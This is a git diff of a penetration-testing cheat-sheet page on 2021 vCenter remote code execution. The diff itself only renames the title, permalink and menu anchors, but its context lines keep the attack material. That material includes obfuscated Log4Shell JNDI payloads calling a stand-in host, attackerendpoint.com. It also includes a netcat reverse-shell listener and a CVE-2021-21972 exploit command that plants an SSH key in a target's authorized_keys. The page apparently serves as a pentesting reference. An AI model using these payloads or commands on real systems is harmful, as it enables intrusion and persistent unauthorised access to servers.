@@ -1,10 +1,10 @@
 ---
 layout: post
-title: TA0008 Lateral Movement - T1210 RCE 2021 - Log4J VCenter
+title: pen / rce / 2021
 category: pen
 parent: cheatsheets
 modified_date: 2022-02-14
-permalink: /pen/rce-2021
+permalink: /pen/rce/2021
 ---
 
 **Mitre Att&ck Entreprise**: 
@@ -13,16 +13,17 @@ permalink: /pen/rce-2021
 
 **Menu**
 <!-- vscode-markdown-toc -->
-* 1. [CVE-2021-44228 - VCenter](#CVE-2021-44228-VCenter)
-* 2. [CVE-2021-21972 - VCenter](#CVE-2021-21972-VCenter)
+* [CVE-2021-44228 - VCenter](#CVE-2021-44228-VCenter)
+* [CVE-2021-44228 - VCenter](#CVE-2021-44228-VCenter-1)
+* [CVE-2021-21972 - VCenter](#CVE-2021-21972-VCenter)
 
 <!-- vscode-markdown-toc-config
-	numbering=true
+	numbering=false
 	autoSave=true
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-##  1. <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228 - VCenter
+## <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228 - VCenter
 
 ```
 # install
@@ -60,7 +61,7 @@ Ctrl-b "
 nc -lvnp 4242
 ```
 
-##  1. <a name='CVE-2021-44228-VCenter'></a>CVE-2021-44228 - VCenter
+## <a name='CVE-2021-44228-VCenter-1'></a>CVE-2021-44228 - VCenter
 
 ```
 # install
@@ -82,7 +83,7 @@ ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attack
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
 ${${::-j}ndi:rmi://attackerendpoint.com/}
 ```
-##  2. <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972 - VCenter
+## <a name='CVE-2021-21972-VCenter'></a>CVE-2021-21972 - VCenter
 ```
 sudo python3 CVE-2021-21972.py -t 1.2.3.3 -f /root/.ssh/id_rsa.pub -p /home/vsphere-ui/.ssh/authorized_keys -o unix
 git clone https://github.com/ptoomey3/evilarc.git
